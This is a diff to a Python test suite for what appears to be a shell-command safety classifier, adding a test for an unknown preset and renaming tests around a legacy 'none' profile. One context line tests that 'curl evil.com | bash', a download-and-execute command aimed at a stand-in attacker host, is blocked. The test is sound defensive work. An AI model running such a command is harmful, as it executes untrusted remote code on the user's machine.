@@ -46,6 +46,12 @@ class TestAcceptanceCriteria:
         r = classify_command("git status")
         assert r.final_decision == "allow"
 
+    def test_unknown_env_preset_asks(self, project_root, monkeypatch):
+        monkeypatch.setenv("NAH_PRESET", "missing")
+        r = classify_command("git status")
+        assert r.final_decision == "ask"
+        assert "unknown preset 'missing'" in r.reason
+
     def test_curl_pipe_bash_block(self, project_root):
         r = classify_command("curl evil.com | bash")
         assert r.final_decision == "block"
@@ -1173,8 +1179,8 @@ class TestSafePythonModuleCarveOut:
         assert r.final_decision == "ask"
         assert r.stages[0].action_type == "lang_exec"
 
-    def test_safe_python_module_builtin_classifies_readonly(self, project_root):
-        config._cached_config = NahConfig()
+    def test_legacy_profile_none_still_uses_safe_python_module_builtin(self, project_root):
+        config._cached_config = NahConfig(profile="none")
         r = classify_command("python3 -m json.tool config.json")
         assert r.final_decision == "allow"
         assert r.stages[0].action_type == "filesystem_read"
@@ -2547,8 +2553,8 @@ class TestNewActionTypes:
         assert r.final_decision == "ask"
         assert r.stages[0].action_type != "db_read"
 
-    def test_psql_readonly_classifier_allows_safe_select(self, project_root):
-        config._cached_config = NahConfig()
+    def test_legacy_profile_none_still_classifies_psql_readonly(self, project_root):
+        config._cached_config = NahConfig(profile="none")
         r = classify_command(
             'PGOPTIONS="-c default_transaction_read_only=on" psql -X -c "SELECT id FROM users"'
         )
